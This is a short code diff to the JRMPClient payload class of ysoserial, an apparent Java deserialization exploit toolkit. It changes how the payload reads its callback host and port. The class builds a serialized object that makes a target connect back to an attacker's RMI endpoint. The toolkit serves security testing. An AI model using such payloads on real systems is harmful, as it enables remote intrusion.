@@ -51,18 +51,17 @@ import ysoserial.payloads.util.PayloadRunner;
 @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
 
-    public Registry getObject ( final String command ) throws Exception {
+    public Registry getObject ( final String[] command ) throws Exception {
 
         String host;
         int port;
-        int sep = command.indexOf(':');
-        if ( sep < 0 ) {
+        if ( command.length == 1 ) {
             port = new Random().nextInt(65535);
-            host = command;
+            host = command[0];
         }
         else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
+            host = command[0];
+            port = Integer.valueOf(command[1]);
         }
         ObjID id = new ObjID(0); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
